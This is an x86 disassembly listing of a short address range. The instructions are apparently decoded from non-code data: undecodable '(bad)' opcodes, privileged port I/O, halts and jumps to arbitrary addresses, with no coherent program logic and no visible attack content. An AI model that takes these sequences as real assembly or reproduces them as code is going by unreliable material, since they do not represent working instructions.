  434b8c:	add    al,0x7e
  434b8e:	aas    
  434b8f:	ret    0x902a
  434b92:	fwait
  434b93:	adc    ch,BYTE PTR [esi+0x63]
  434b96:	lods   al,BYTE PTR ds:[esi]
  434b97:	adc    BYTE PTR [esi],ah
  434b99:	jmp    0x471cef9c
  434b9e:	mov    eax,0x5b60432e
  434ba3:	bound  esp,QWORD PTR [ebx+0x29d3bfa6]
  434ba9:	inc    edi
  434baa:	out    dx,al
  434bab:	add    edi,ecx
  434bad:	hlt    
  434bae:	test   al,0xfa
  434bb0:	pushf  
  434bb1:	or     ch,BYTE PTR [eax-0x4e79d354]
  434bb7:	fsubr  DWORD PTR [eax-0x80]
  434bba:	xchg   ecx,eax
  434bbb:	push   edx
  434bbc:	and    dl,bl
  434bbe:	fwait
  434bbf:	xor    dh,BYTE PTR [edx]
  434bc1:	mov    al,0x25
  434bc3:	cli    
  434bc4:	dec    edi
  434bc5:	push   ss
  434bc6:	sbb    ebp,DWORD PTR [edx]
  434bc8:	and    bl,cl
  434bca:	test   BYTE PTR gs:[esi-0x49],ch
  434bce:	in     eax,0xd0
  434bd0:	sbb    DWORD PTR [eax],ecx
  434bd2:	cmp    DWORD PTR [ebp+edi*1+0x55],edi
  434bd6:	xor    al,BYTE PTR [ebp+0x13d10c38]
  434bdc:	mov    dl,0x66
  434bde:	push   esi
  434bdf:	pop    ds
  434be0:	std    
  434be1:	xor    esi,0x1a
  434be4:	xchg   DWORD PTR [ebp+0x1a],esp
  434be7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434be8:	imul   esi,DWORD PTR [ecx],0x4f
  434beb:	jmp    0x73b011cf
  434bf0:	or     eax,0x4c18d1cb
  434bf5:	scas   al,BYTE PTR es:[edi]
  434bf6:	mov    eax,ebp
  434bf8:	(bad)  
  434bf9:	mov    DWORD PTR [eax],ebx
  434bfb:	push   ebx
  434bfc:	enter  0x4856,0x8e
  434c00:	add    al,BYTE PTR [ebx+eax*1+0x55d21634]
  434c07:	int3   
  434c08:	das    
  434c09:	pushf  
  434c0a:	addr16 ret 
  434c0c:	xor    bl,dl
  434c0e:	das    
  434c0f:	adc    DWORD PTR [ebx-0x6b6c68e2],esp
  434c15:	test   al,0x46
  434c17:	mov    ebp,0x3b4f7317
  434c1c:	lock call 0xce462685
  434c22:	inc    ecx
  434c23:	add    bh,ah
  434c25:	hlt    
  434c26:	ins    BYTE PTR es:[edi],dx
  434c27:	in     al,dx
  434c28:	mov    esp,esi
  434c2a:	scas   al,BYTE PTR es:[edi]
  434c2b:	and    al,0x4
  434c2d:	mov    eax,ds:0x61436391
  434c32:	(bad)  
  434c33:	xor    BYTE PTR [edi+0x44],bh
  434c36:	scas   al,BYTE PTR es:[edi]
  434c37:	fisub  DWORD PTR [ebp-0x5]
  434c3a:	fwait
  434c3b:	jns    0x434c01
  434c3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434c3e:	iret   
  434c3f:	inc    ebx
  434c40:	adc    BYTE PTR [ebp+0x32],0x96
  434c44:	mov    ds:0x4806bb2d,eax
  434c49:	jl     0x434ca9
  434c4b:	mov    DWORD PTR [ebx],ecx
  434c4d:	test   al,0x3c
  434c4f:	data16 xor BYTE PTR [eax+0x4e],cl
  434c53:	int3   
  434c54:	ja     0x434ca6
  434c56:	mov    ebp,0x633a9880
  434c5b:	iret   
  434c5c:	loopne 0x434c41
  434c5e:	add    dl,BYTE PTR [eax-0x562bd5ab]
  434c64:	jge    0x434c86
  434c66:	test   al,0x2c
  434c68:	push   ss
  434c69:	sub    BYTE PTR [ebx+0x4e4aa881],al
  434c6f:	les    eax,FWORD PTR [ecx-0x2e]
  434c72:	loop   0x434c4d
  434c74:	(bad)  
  434c75:	shl    DWORD PTR [ecx],1
  434c77:	sbb    DWORD PTR [eax],edx
  434c79:	xor    DWORD PTR [ebx+0xc],0xffffffc2
  434c7d:	mov    ebp,esp
  434c7f:	lods   al,BYTE PTR ds:[esi]
  434c80:	sar    DWORD PTR [eax],cl
  434c82:	dec    edx
  434c83:	cli    
  434c84:	bound  esp,QWORD PTR [ecx-0x1f]
  434c87:	pusha  
  434c88:	and    al,0x8d
  434c8a:	adc    ecx,DWORD PTR [eax+eax*2]
  434c8d:	dec    ebp
  434c8e:	dec    esp
  434c8f:	shl    BYTE PTR ds:0x2864c199,cl
  434c95:	fld    TBYTE PTR [eax-0x7c5b6b00]
  434c9b:	pop    esi
  434c9c:	pop    edx
  434c9d:	and    al,BYTE PTR [ecx]
  434c9f:	test   al,0x90
  434ca1:	les    edi,FWORD PTR [edx+0x71033cd9]
  434ca7:	iret   
  434ca8:	mov    eax,0x680039c
  434cad:	xor    BYTE PTR [esi+eax*8+0x48ba8bdb],0x21
  434cb5:	adc    esi,DWORD PTR [esi]
  434cb7:	sub    esi,ecx
  434cb9:	and    DWORD PTR [edx+0x3eb16920],esp
  434cbf:	adc    bh,dh
  434cc1:	jae    0x434c55
  434cc3:	xor    BYTE PTR [ecx-0x1dd91be0],bh
  434cc9:	cmp    cl,BYTE PTR [esi+0x4f]
  434ccc:	shr    BYTE PTR ds:0xb8304498,0x80
  434cd3:	into   
  434cd4:	inc    ebx
  434cd5:	sbb    eax,DWORD PTR [eax+0x7ce104f8]
  434cdb:	pop    eax
  434cdc:	cs sub al,0x31
  434cdf:	adc    al,0xef
  434ce1:	cwde   
  434ce2:	mov    cs,ebp
  434ce4:	pop    es
  434ce5:	outs   dx,DWORD PTR ds:[esi]
  434ce6:	ret    0xe8f9
  434ce9:	(bad)  
  434cea:	pusha  
  434ceb:	pop    esp
  434cec:	mov    ebp,DWORD PTR [edi-0x7e]
  434cef:	xor    BYTE PTR [edi],ah
  434cf1:	loopne 0x434d12
  434cf3:	push   ss
  434cf4:	aaa    
  434cf5:	push   cs
  434cf6:	sar    DWORD PTR [esp+edi*2],cl
  434cf9:	or     DWORD PTR [eax],ecx
  434cfb:	mov    al,BYTE PTR [ebp+0x4c]
  434cfe:	aam    0x83
  434d00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  434d01:	push   ss
  434d02:	push   edx
  434d03:	jbe    0x434d76
  434d05:	pop    eax
  434d06:	pop    esi
  434d07:	xchg   esp,eax
  434d08:	sbb    eax,0xbef16961
  434d0d:	sbb    ch,ch
  434d0f:	dec    ecx
  434d10:	out    dx,eax
  434d11:	mov    edx,0x8c6d6d10
  434d16:	mov    esi,0x3083ed25
  434d1b:	fst    QWORD PTR [ebp-0x27]
  434d1e:	mov    cl,0x79
  434d20:	ss out 0x5,al
  434d23:	add    al,0x2a
  434d25:	pop    es
  434d26:	or     al,BYTE PTR [edx]
  434d28:	or     DWORD PTR [edi+0x60],eax
  434d2b:	adc    ah,dh
  434d2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434d2e:	in     eax,0xa4
  434d30:	test   eax,0xd48fb8c1
  434d35:	out    dx,al
  434d36:	hlt    
  434d37:	scas   al,BYTE PTR es:[edi]
  434d38:	push   ecx
  434d39:	cmp    DWORD PTR [edx-0x7c],ecx
  434d3c:	cli    
  434d3d:	mov    ?,edi
  434d3f:	add    DWORD PTR [ebp+ebx*1+0x6b],esi
  434d43:	add    BYTE PTR [edx+eiz*8+0x71a1acac],dl
  434d4a:	shl    BYTE PTR [ecx+0x22],0x21
  434d4e:	xor    BYTE PTR [eax],dh
  434d50:	push   ecx
  434d51:	cli    
  434d52:	gs sahf 
  434d54:	test   BYTE PTR ds:[eax+esi*2],dl
  434d58:	fs xor al,0xbc
  434d5b:	popf   
  434d5c:	mov    eax,0x2e6c88f6
  434d61:	pusha  
  434d62:	xchg   ebx,eax
  434d63:	dec    ebx
  434d64:	inc    esi
  434d65:	sub    al,0xe6
  434d67:	cmc    
  434d68:	add    DWORD PTR [eax],edx
  434d6a:	cld    
  434d6b:	cwde   
  434d6c:	adc    BYTE PTR [edx+eiz*2+0x72],ch
  434d70:	inc    eax
  434d71:	xchg   esi,eax
  434d72:	in     al,0x4
  434d74:	sub    dl,BYTE PTR [eax+0x7f]
  434d77:	clc    
  434d78:	push   cs
  434d79:	loopne 0x434d36
  434d7b:	sub    al,0xc9
  434d7d:	add    bh,BYTE PTR [ebx]
  434d7f:	iret   
  434d80:	jmp    0x434d3b
  434d82:	mov    ds:0x65093983,eax
  434d87:	or     eax,0x3ee878a0
  434d8c:	push   ds
  434d8d:	ins    BYTE PTR es:[edi],dx
  434d8e:	push   ss
  434d8f:	sbb    DWORD PTR [ebp+0x8],eax
  434d92:	jae    0x434d4a
  434d94:	pusha  
  434d95:	push   eax
  434d96:	jnp    0x434d70
  434d98:	jge    0x434d92
  434d9a:	or     al,dh
  434d9c:	or     eax,0x91222270
  434da1:	clc    
  434da2:	mov    ebx,?
  434da4:	xchg   edi,eax
  434da5:	mov    bl,0x89
  434da7:	nop
  434da8:	in     al,dx
  434da9:	rol    cl,1
  434dab:	pop    ecx
  434dac:	add    bl,BYTE PTR [eax-0x79]
  434daf:	clc    
  434db0:	addr16 push 0xffffffe8
  434db3:	push   ecx
  434db4:	sbb    DWORD PTR [eax-0x7f],ebp
  434db7:	hlt    
  434db8:	xchg   ebx,eax
  434db9:	sub    al,0xa1
  434dbb:	or     DWORD PTR [edi-0x6a],0x3a701162
  434dc2:	add    ebp,DWORD PTR [edx+eax*2-0x4b]
  434dc6:	test   ecx,ebp
  434dc8:	push   ss
  434dc9:	out    0xcd,eax
  434dcb:	push   edi
  434dcc:	loop   0x434e07
  434dce:	mov    ecx,0x872b50f6
  434dd3:	xchg   esi,eax
  434dd4:	(bad)  
  434dd5:	bound  esp,QWORD PTR [ecx]
  434dd7:	in     al,dx
  434dd8:	retf   0x2e61
  434ddb:	ret    0xa851
  434dde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  434ddf:	push   0xb588d009
  434de4:	retf   0x2bac
  434de7:	push   0x5d91691b
  434dec:	xchg   ecx,eax
  434ded:	dec    ebp
  434dee:	xchg   esi,eax
  434def:	hlt    
  434df0:	sbb    eax,0xbebc0e3e
  434df5:	adc    esi,DWORD PTR [ecx]
  434df7:	mov    eax,ds:0x36980909
  434dfc:	cmp    al,BYTE PTR [edx+0x2]
  434dff:	xchg   ebp,eax
  434e00:	sbb    eax,0xaba4013f
  434e05:	int3   
  434e06:	dec    ebp
  434e07:	call   0xc66:0x2be8f68f
  434e0e:	push   cs
  434e0f:	fdivr  st(3),st
  434e11:	mov    dl,0x3d
  434e13:	int    0x9c
  434e15:	loop   0x434ddb
  434e17:	dec    ebp
  434e18:	pop    edx
  434e19:	enter  0x3919,0xc9
  434e1d:	add    eax,0xa0029355
  434e22:	mov    ebx,0x8ec96fd9
  434e27:	mov    edx,0xa5216cb6
  434e2c:	test   ebx,edi
  434e2e:	jl     0x434dbc
  434e30:	in     eax,0x5e
  434e32:	mov    ah,0xe3
  434e34:	mov    edx,0x57270d0c
  434e39:	cmp    eax,0x764477b5
  434e3e:	data16 mov ch,0xc4
  434e41:	cwde   
  434e42:	cld    
  434e43:	imul   ecx,DWORD PTR [ebx+eax*8+0x1b040c88],0xf86a1d97
  434e4e:	push   eax
  434e4f:	push   0x59ac877b
  434e54:	add    BYTE PTR [esi+0x52676121],dh
  434e5a:	push   cs
  434e5b:	mov    bl,0xf5
  434e5d:	leave  
  434e5e:	sahf   
  434e5f:	jle    0x434e95
  434e61:	sbb    eax,0x7e2c6d9c
  434e66:	mov    esp,0x681398ea
  434e6b:	pop    esp
  434e6c:	lock div DWORD PTR ds:0x34989bc8
  434e73:	hlt    
  434e74:	inc    ecx
  434e75:	cdq    
  434e76:	call   0xc0677f00
  434e7b:	and    ah,bh
  434e7d:	cmp    al,0x30
  434e7f:	das    
  434e80:	xchg   ebx,eax
  434e81:	cwde   
  434e82:	add    eax,0xce4d7934
  434e87:	loope  0x434e61
  434e89:	mov    dh,BYTE PTR [edi-0x7e]
  434e8c:	inc    ebp
  434e8d:	add    BYTE PTR [esi],bl
  434e8f:	(bad)  
  434e90:	pusha  
  434e91:	les    edi,FWORD PTR [edi-0x7b]
  434e94:	es dec ecx
  434e96:	test   al,0x17
  434e98:	adc    BYTE PTR [ebx],0x29
  434e9b:	neg    BYTE PTR [esp+esi*1]
  434e9e:	cmp    DWORD PTR [edx+ebx*4+0x4da25c2c],eax
  434ea5:	push   0xf29c003c
  434eaa:	call   0x331636c3
  434eaf:	push   ebx
  434eb0:	push   ebp
  434eb1:	jg     0x434e9f
  434eb3:	sub    esi,DWORD PTR [edx-0x2d]
  434eb6:	inc    ecx
  434eb7:	inc    ecx
  434eb8:	mov    cl,0x0
  434eba:	inc    eax
  434ebb:	je     0x434f2e
  434ebd:	mov    ds:0x93c3f481,al
  434ec2:	fstp   QWORD PTR [ebp+ebp*1+0x3489cca]
  434ec9:	les    esp,FWORD PTR [eax]
  434ecb:	ficom  WORD PTR [ebx+0x50]
  434ece:	push   ecx
  434ecf:	dec    esp
  434ed0:	or     BYTE PTR [ecx+0x4],dl
  434ed3:	ret    0x6922
  434ed6:	ror    BYTE PTR [esi-0x47309535],1
  434edc:	int3   
  434edd:	lods   eax,DWORD PTR ds:[esi]
  434ede:	xchg   edi,eax
  434edf:	fidiv  WORD PTR [ebx+0x42]
  434ee2:	push   es
  434ee3:	shl    BYTE PTR [eax+0x70625b40],0x39
  434eea:	ror    DWORD PTR [eax-0x23ed8d65],0x90
  434ef1:	pop    ecx
  434ef2:	outs   dx,BYTE PTR ds:[esi]
  434ef3:	(bad)  
  434ef4:	in     al,0x1c
  434ef6:	jmp    0x4b5e:0xe0106c9e
  434efd:	fistp  QWORD PTR [edi]
  434eff:	pushf  
  434f00:	sub    eax,0x8217dcbc
  434f05:	push   edi
  434f06:	sbb    cl,cl
  434f08:	leave  
  434f09:	shl    BYTE PTR [ebx],0x91
  434f0c:	test   eax,0x6832f37d
  434f11:	or     cl,ah
  434f13:	mov    BYTE PTR [ecx+eax*1+0x138c55cb],0x24
  434f1b:	mov    ds:0x19b6078c,eax
  434f20:	rcr    BYTE PTR [esi],cl
  434f22:	and    DWORD PTR [ebx],eax
  434f24:	arpl   WORD PTR [ebp+edx*4+0x5c],cx
  434f28:	cli    
  434f29:	test   eax,0x89da2e5b
  434f2e:	rol    dl,0x63
  434f31:	dec    esp
  434f32:	dec    eax
  434f33:	sub    BYTE PTR [ebp-0x76],ch
  434f36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434f37:	gs push 0xffffffb0
  434f3a:	mov    bh,0x23
  434f3c:	add    al,0xd1
  434f3e:	or     al,0xc6
  434f40:	fs mov dh,0xa0
  434f43:	pushf  
  434f44:	or     BYTE PTR ds:0xd8e13acc,0xf4
  434f4b:	mov    esi,0x7ce7293
  434f50:	jbe    0x434f8b
  434f52:	call   0x1ed1:0x8ba1e004
  434f59:	call   0xd4292709
  434f5e:	sbb    esi,ebp
  434f60:	inc    edi
  434f61:	mov    ah,0xab
  434f63:	pop    esi
  434f64:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  434f66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434f67:	mov    dl,0xd6
  434f69:	push   edi
  434f6a:	pop    ss
  434f6b:	sbb    ecx,DWORD PTR [ebp-0x53bd30b8]
  434f71:	mov    edx,edi
  434f73:	loop   0x434fb2
  434f75:	pop    esp
  434f77:	cmp    eax,0xc5c49868
  434f7c:	jae    0x434fa5
  434f7e:	pop    ebx
  434f7f:	dec    esi
  434f80:	or     eax,0xaa0b7e46
  434f85:	ds jae 0x434f5d
  434f88:	and    DWORD PTR [ebx],ecx
  434f8a:	inc    ebp
  434f8b:	ss cmp al,0xcc
  434f8e:	push   esi
  434f8f:	xor    DWORD PTR [edx],0xffffffb5
  434f92:	pop    ss
  434f93:	(bad)  
  434f94:	mov    ds:0xb8287ed4,al
  434f99:	repz shl BYTE PTR [eax+ebx*8],1
  434f9d:	lea    ebx,[ebp+edi*1-0x33f32375]
  434fa4:	inc    edi
  434fa5:	dec    esi
  434fa6:	(bad)  
  434fa7:	leave  
  434fa8:	adc    BYTE PTR [eax],0x75
  434fab:	sbb    eax,0x116615a0
  434fb0:	cmp    BYTE PTR [esi],cl
  434fb2:	neg    BYTE PTR [eax]
  434fb4:	mov    esi,0x1cec4e10
  434fb9:	push   edi
  434fba:	xor    BYTE PTR [esi+0x549f340e],0xe7
  434fc1:	pushf  
  434fc2:	xor    edx,DWORD PTR [eax]
  434fc4:	lods   eax,DWORD PTR ds:[esi]
  434fc5:	cwde   
  434fc6:	push   eax
  434fc7:	mov    ds:0xa0439074,eax
  434fcc:	lods   al,BYTE PTR ds:[esi]
  434fcd:	add    DWORD PTR [eax+0xe],ecx
  434fd0:	adc    edx,DWORD PTR [ecx]
  434fd2:	imul   BYTE PTR [eax-0x6a]
  434fd5:	rep stos DWORD PTR es:[edi],eax
  434fd7:	dec    ecx
  434fd8:	mov    eax,0x2bbce720
  434fdd:	scas   al,BYTE PTR es:[edi]
  434fde:	popa   
  434fdf:	loop   0x434f91
  434fe1:	fild   WORD PTR [ecx+0x2b]
  434fe4:	mov    cl,0x21
  434fe6:	mov    eax,ds:0x5304e2c9
  434feb:	mov    dh,0xf0
  434fed:	xor    DWORD PTR [edi],eax
  434fef:	cmp    BYTE PTR [ebp+0x8e07309],ch
  434ff5:	inc    esp
  434ff6:	inc    ebp
  434ff7:	(bad)  
  434ff8:	cmp    DWORD PTR [ecx-0x1d5ea1ad],ebx
  434ffe:	inc    ebx
  434fff:	fdiv   QWORD PTR [ecx]
  435001:	sub    DWORD PTR [ebx+0x36],ecx
  435004:	loop   0x434fcd
  435006:	jmp    0x23859d2f
  43500b:	test   eax,0x74d1c99f
  435010:	inc    ebx
  435011:	(bad)  
  435012:	or     al,0xa4
  435014:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  435016:	adc    ecx,DWORD PTR [ebx-0x187fd98]
  43501c:	mov    eax,ds:0xfc78f368
  435021:	lea    esi,[ebx-0x7b]
  435024:	nop
  435025:	es out 0x1,al
  435028:	push   ds
  435029:	bound  edx,QWORD PTR [ebp+eiz*2-0x68]
  43502d:	pop    esp
  43502e:	cmp    cl,bl
  435030:	mov    eax,ds:0x4d8fef01
  435035:	add    DWORD PTR [ecx+ebx*1],eax
  435038:	pusha  
  435039:	adc    DWORD PTR [ebx],edx
  43503b:	inc    edi
  43503c:	add    dl,BYTE PTR [ecx]
  43503e:	test   eax,0x5232ddcb
  435043:	mov    eax,DWORD PTR [ebp+0x47]
  435046:	dec    esp
  435047:	aas    
  435048:	jge    0x4350c1
  43504a:	sub    esi,DWORD PTR [esi]
  43504c:	rcl    BYTE PTR [edx+0x6c],0x92
  435050:	ret    
  435051:	shl    DWORD PTR [edi-0xad98757],1
  435057:	adc    edi,DWORD PTR [esi-0x90403a4]
  43505d:	fdiv   DWORD PTR [esi*1-0x23b9060f]
  435064:	call   DWORD PTR [eax+0x1eb9551c]
  43506a:	jae    0x434ffe
  43506c:	(bad)  
  43506d:	fbld   TBYTE PTR [ebx]
  43506f:	lahf   
  435070:	nop
  435071:	lods   eax,DWORD PTR ds:[esi]
  435072:	xor    dh,BYTE PTR [ebx+0x50]
  435075:	mov    bl,0x6c
  435077:	out    0xa4,al
  435079:	ss (bad) 
  43507b:	enter  0x821c,0x87
  43507f:	gs jbe 0x435064
  435082:	xchg   ebp,eax
  435083:	sbb    bh,dh
  435085:	sbb    DWORD PTR [ecx],ebx
  435087:	ret    
  435088:	adc    DWORD PTR [eax+0x27d16bc],0x1d1e00af
  435092:	or     al,0xfb
  435094:	xor    eax,0x227bec39
  435099:	(bad)  
  43509a:	or     al,0xe0
  43509c:	push   edx
  43509d:	jp     0x435096
  43509f:	pop    ecx
  4350a0:	cdq    
  4350a1:	jo     0x435056
  4350a3:	ds cli 
  4350a5:	ret    
  4350a6:	mov    ebp,ecx
  4350a8:	cld    
  4350a9:	xor    BYTE PTR [esi+0x38],al
  4350ac:	in     eax,0x24
  4350ae:	and    esi,DWORD PTR [ebx]
  4350b0:	test   eax,0xc9facb96
  4350b5:	inc    ecx
  4350b6:	inc    edi
  4350b7:	cwde   
  4350b8:	xchg   esp,eax
  4350b9:	dec    ecx
  4350ba:	dec    eax
  4350bb:	jg     0x4350ea
  4350bd:	cli    
  4350be:	pop    es
  4350bf:	dec    edi
  4350c0:	and    eax,0xc3fa27be
  4350c5:	jl     0x435067
  4350c7:	cdq    
  4350c8:	(bad)  
  4350ca:	fcmovbe st,st(1)
  4350cc:	sub    eax,0xb108f2a3
  4350d1:	jno    0x43513b
  4350d3:	jbe    0x43509d
  4350d5:	dec    esp
  4350d6:	mov    ebp,0x5161f25b
  4350db:	xchg   edx,eax
  4350dc:	int    0x29
  4350de:	jl     0x4350e0
  4350e0:	test   BYTE PTR [eax-0x78dda19f],dl
  4350e6:	add    DWORD PTR [edi-0x6eee59c6],eax
  4350ec:	cmp    BYTE PTR [ebp+ecx*1-0x37],cl
  4350f0:	push   eax
  4350f1:	jns    0x43513f
  4350f3:	leavew 
  4350f5:	cmp    DWORD PTR [edx],eax
  4350f7:	push   0xc14084cf
  4350fc:	add    eax,0xb0c12994
  435101:	inc    ebp
  435102:	and    al,0x23
  435104:	mov    ds:0xc7103e00,al
  435109:	dec    edi
  43510a:	add    ecx,DWORD PTR [eax-0x18deaa86]
  435110:	leave  
  435111:	adc    esi,DWORD PTR [esi]
  435113:	inc    ebx
  435114:	or     eax,0x5894e182
  435119:	cs xchg edx,eax
  43511b:	or     bh,ah
  43511d:	add    esi,DWORD PTR [esi-0x37e3edeb]
  435123:	icebp  
  435124:	pop    esp
  435125:	sub    al,0x80
  435127:	push   ds
  435128:	cmp    DWORD PTR [edi-0x46],edx
  43512b:	cs es adc edi,ebp
  43512f:	mov    bh,0xe4
  435131:	sub    al,0x34
  435133:	xor    al,dl
  435135:	adc    BYTE PTR [eax+edx*2+0x2c],dl
  435139:	out    0xea,eax
  43513b:	aaa    
  43513c:	xchg   ebx,eax
  43513d:	rcr    BYTE PTR ds:0x1bc061b,1
  435143:	test   al,0xa8
  435145:	cmp    al,0x89
  435147:	out    0x44,al
  435149:	mov    ah,0x7
  43514b:	cmc    
  43514c:	mov    DWORD PTR [ecx-0x33],eax
  43514f:	stc    
  435150:	out    0x88,eax
  435152:	mov    bh,0xe3
  435154:	sbb    ebp,0x50f17b8a
  43515a:	and    ebx,ebp
  43515c:	and    DWORD PTR [ecx+eax*4],ebp
  43515f:	xchg   ebp,eax
  435160:	push   es
  435161:	rcl    BYTE PTR [ecx],0x2
  435164:	cs daa 
  435166:	sti    
  435167:	sbb    al,0x95
  435169:	imul   esi,DWORD PTR [eax],0xffffffa4
  43516c:	sti    
  43516d:	fistp  WORD PTR [ecx]
  43516f:	arpl   WORD PTR [ecx+0x5b],si
  435172:	pop    es
  435173:	sar    DWORD PTR [edi],cl
  435175:	adc    DWORD PTR [esi],ebp
  435177:	inc    esp
  435178:	sub    DWORD PTR [edx+0x3f],edx
  43517b:	xchg   DWORD PTR [edi+eiz*4+0x12],esp
  43517f:	add    ch,BYTE PTR [edi]
  435181:	pop    ebp
  435182:	lahf   
  435183:	dec    esp
  435184:	adc    bl,0x31
  435187:	pop    ss
  435188:	push   esp
  435189:	std    
  43518a:	and    DWORD PTR [ebx+ecx*1+0x1ee41904],eax
  435191:	cwde   
  435192:	repz je 0x435162
  435195:	lds    ebx,FWORD PTR [eax]
  435197:	mov    bh,0x6e
  435199:	fst    DWORD PTR [ecx]
  43519b:	inc    edi
  43519c:	popa   
  43519d:	mov    edi,DWORD PTR [esi+0x394df6b8]
  4351a3:	jmp    0x5aa445af
  4351a8:	nop
  4351a9:	loopne 0x4351b5
  4351ab:	fmul   DWORD PTR [ecx+ebp*2]
  4351ae:	cmp    al,0xfe
  4351b0:	pop    eax
  4351b1:	push   cs
  4351b2:	push   ecx
  4351b3:	xchg   edx,eax
  4351b4:	scas   al,BYTE PTR es:[edi]
  4351b5:	cmp    eax,0x8c1ccf19
  4351ba:	xor    DWORD PTR [edi+esi*8-0x4],ecx
  4351be:	mov    esi,ebp
  4351c0:	stc    
  4351c1:	push   eax
  4351c2:	test   al,0x3b
  4351c4:	ror    DWORD PTR [ecx],0x8b
  4351c7:	mov    edi,0x2fb18280
  4351cc:	retf   0x1951
  4351cf:	xchg   edx,eax
  4351d0:	(bad)  
  4351d1:	mov    bl,ch
  4351d3:	xchg   ebx,eax
  4351d4:	out    dx,al
  4351d5:	int3   
  4351d6:	dec    ecx
  4351d7:	or     esp,DWORD PTR [edx+0x13]
  4351da:	mov    ds:0x943d0417,al
  4351df:	in     eax,dx
  4351e0:	std    
  4351e1:	jno    0x4351f0
  4351e3:	cdq    
  4351e4:	mov    WORD PTR [ebx],es
  4351e6:	xor    DWORD PTR [edi-0x10],edx
  4351e9:	inc    ebx
  4351ea:	mov    al,ds:0xc8519322
  4351ef:	es add eax,0x9b29d3bc
  4351f5:	cdq    
  4351f6:	cmp    DWORD PTR [edx],eax
  4351f8:	xchg   ebp,eax
  4351f9:	sub    al,0x47
  4351fb:	push   cs
  4351fc:	cwde   
  4351fd:	add    eax,0x30994d39
  435202:	out    dx,al
  435203:	inc    esp
  435204:	mov    esp,0x5e433d8f
  435209:	or     ecx,DWORD PTR [esi]
  43520b:	push   eax
  43520c:	xor    dh,BYTE PTR [eax+0x39]
  43520f:	fldcw  WORD PTR [ebx+0x64]
  435212:	repz xchg edx,eax
  435214:	jmp    0xfc67:0x540f8cdd
  43521b:	pusha  
  43521c:	inc    edx
  43521d:	push   ebx
  43521e:	in     eax,0x9
  435220:	mov    es,edx
  435222:	pushf  
  435223:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435224:	adc    DWORD PTR [edx+ecx*2],ebp
  435227:	mov    ecx,0x9103c830
  43522c:	or     eax,0xbaab2a38
  435231:	and    BYTE PTR [ecx+0x588024d8],cl
  435237:	out    0xa2,al
  435239:	icebp  
  43523a:	pop    ebp
  43523b:	jb     0x43529e
  43523d:	inc    edx
  43523e:	ss pop ds
  435240:	ss cs mov cl,0x71
  435244:	cmp    al,0x9f
  435246:	js     0x43520f
  435248:	dec    ecx
  435249:	pushf  
  43524a:	sbb    edx,0x419e3eba
  435250:	adc    eax,0xf873c21a
  435255:	push   cs
  435256:	add    BYTE PTR [ebx+0x27e8c82c],bh
  43525c:	xor    ch,ch
  43525e:	or     BYTE PTR [ecx],ch
  435260:	es popf 
  435262:	ror    BYTE PTR [ebx],1
  435264:	les    edx,FWORD PTR [edx]
  435266:	pushf  
  435267:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  435268:	mov    ebp,0x6624572
  43526d:	adc    BYTE PTR [eax-0x4abb02ef],ah
  435273:	xchg   esp,eax
  435274:	lods   al,BYTE PTR ds:[esi]
  435275:	mov    es,WORD PTR [ebx-0x21]
  435278:	mov    WORD PTR [eax-0x37],ss
  43527b:	sbb    eax,0x52bc3066
  435280:	rcl    BYTE PTR [eax+esi*8+0x293c5a50],0x86
  435288:	lahf   
  435289:	ret    0x1765
  43528c:	fs fwait
  43528e:	ins    DWORD PTR es:[edi],dx
  43528f:	dec    ebx
  435290:	inc    esi
  435291:	sbb    dl,ah
  435293:	imul   esp,DWORD PTR [eax],0xffffffa4
  435296:	inc    ebx
  435297:	leave  
  435298:	hlt    
  435299:	sbb    al,0x88
  43529b:	xchg   ebx,eax
  43529c:	es in  eax,0x63
  43529f:	mov    edx,0xf7a762a7
  4352a4:	mov    eax,gs
  4352a6:	fisub  WORD PTR [esi-0x61]
  4352a9:	xchg   edi,eax
  4352aa:	repz or dh,BYTE PTR [eax-0x38]
  4352ae:	add    ch,BYTE PTR [ebx]
  4352b0:	fst    QWORD PTR [ebp+eax*1-0x5c69aee4]
  4352b7:	xor    al,bh
  4352b9:	rol    DWORD PTR [edx-0x6923dd02],0x8d
  4352c0:	xchg   BYTE PTR [edi+0x14f23a06],cl
  4352c6:	loop   0x4352e4
  4352c8:	retf   
  4352c9:	ss into 
  4352cb:	or     BYTE PTR [eiz*1+0x1bc2e346],0xf
  4352d3:	pusha  
  4352d4:	dec    ecx
  4352d5:	icebp  
  4352d6:	lods   al,BYTE PTR ds:[esi]
  4352d7:	xchg   ecx,eax
  4352d8:	clc    
  4352d9:	jnp    0x43532f
  4352db:	(bad)  
  4352dc:	sub    BYTE PTR [edi+0x379b64e5],al
  4352e2:	mov    dl,0x71
  4352e4:	out    dx,al
  4352e5:	xchg   ecx,eax
  4352e6:	mov    ecx,0x4c38c800
  4352eb:	add    ah,al
  4352ed:	nop
  4352ee:	in     al,dx
  4352ef:	pop    eax
  4352f0:	(bad)  
  4352f1:	(bad)  
  4352f2:	(bad)  
  4352f3:	pop    esp
  4352f4:	dec    ecx
  4352f5:	aas    
  4352f6:	daa    
  4352f7:	fs sti 
  4352f9:	sbb    dh,BYTE PTR [ebx-0x5c]
  4352fc:	xor    esi,eax
  4352fe:	clc    
  4352ff:	jbe    0x4352d7
  435301:	cs dec esi
  435303:	cmp    BYTE PTR [edx+0x2b],dh
  435306:	mov    al,0xb7
  435308:	jns    0x435341
  43530a:	call   0xd8785357
  43530f:	iret   
  435310:	xlat   BYTE PTR ds:[ebx]
  435311:	jecxz  0x4352f0
  435313:	lods   eax,DWORD PTR ds:[esi]
  435314:	fldenv [edi-0x57]
  435317:	frstor [edi+0x772143e4]
  43531d:	jl     0x43538e
  43531f:	enter  0x998,0x42
  435323:	shl    DWORD PTR [eax-0x6c28edd],cl
  435329:	xor    al,0xa8
  43532b:	lock jl 0x4352b4
  43532e:	and    ecx,DWORD PTR [edi]
  435330:	scas   eax,DWORD PTR es:[edi]
  435331:	mov    esi,0x98c6f5b2
  435336:	sub    dh,al
